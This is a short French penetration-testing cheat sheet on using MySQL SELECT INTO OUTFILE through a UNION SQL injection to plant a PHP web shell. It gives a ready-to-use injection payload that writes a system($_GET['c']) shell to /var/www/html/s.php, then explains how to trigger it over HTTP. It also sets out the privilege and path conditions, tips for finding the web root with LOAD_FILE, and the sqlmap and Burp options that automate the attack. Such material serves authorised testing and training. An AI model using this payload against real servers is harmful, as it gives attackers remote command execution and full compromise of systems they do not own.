---
title: "Écrire un web shell avec MySQL INTO OUTFILE"
description: "Utiliser SELECT INTO OUTFILE depuis une injection MySQL pour déposer un web shell dans la racine du document, et les conditions requises de privilège FILE, secure_file_priv et de chemin."
keywords:
  - INTO OUTFILE
  - web shell
  - écriture de fichier MySQL
  - secure_file_priv
  - racine du document
---

# INTO OUTFILE

`SELECT ... INTO OUTFILE '/path/file'` écrit les lignes sélectionnées dans un fichier sur l'hôte de la base de données. Écrire un petit script PHP (ou autre côté serveur) dans un répertoire que le serveur web exécute transforme l'accès en écriture SQL en exécution de commandes via HTTP.

Dans une injection union, sélectionnez la source du shell dans la position et ajoutez l'`INTO OUTFILE` :

```sql
' UNION SELECT '<?php system($_GET["c"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/s.php'-- 
```

Requêter `/s.php?c=id` exécute alors des commandes sous l'utilisateur du serveur web. Plusieurs conditions doivent être réunies :

- Le privilège `FILE` et un `secure_file_priv` qui autorise le répertoire cible (valeur vide) ou qui est ce répertoire.
- L'utilisateur du processus MySQL peut écrire dans le chemin, et le chemin est à l'intérieur de la racine web, donc vous devez connaître ou deviner la racine du document (lisez-la d'abord depuis un fichier de configuration avec `LOAD_FILE`).
- Le fichier ne doit pas déjà exister. `INTO OUTFILE` refuse d'écraser.

`INTO OUTFILE` applique un formatage de ligne et de colonne (terminateurs de ligne, échappement), ce qui convient pour un script texte mais corrompt un contenu binaire exact. Pour des octets bruts, utilisez plutôt `INTO DUMPFILE`. Si la racine web exacte est inconnue, écrire vers plusieurs candidats courants ou lire d'abord la configuration du serveur est généralement plus rapide que de deviner à l'aveugle.

## Outils

- **sqlmap** : écrit un web shell avec `--file-write` en utilisant `INTO OUTFILE`.
- **Burp Repeater** : forger et placer le payload `INTO OUTFILE` à la main.

## Références

- MySQL Reference Manual: SELECT INTO OUTFILE, `secure_file_priv`
- OWASP Testing Guide: Testing for SQL Injection
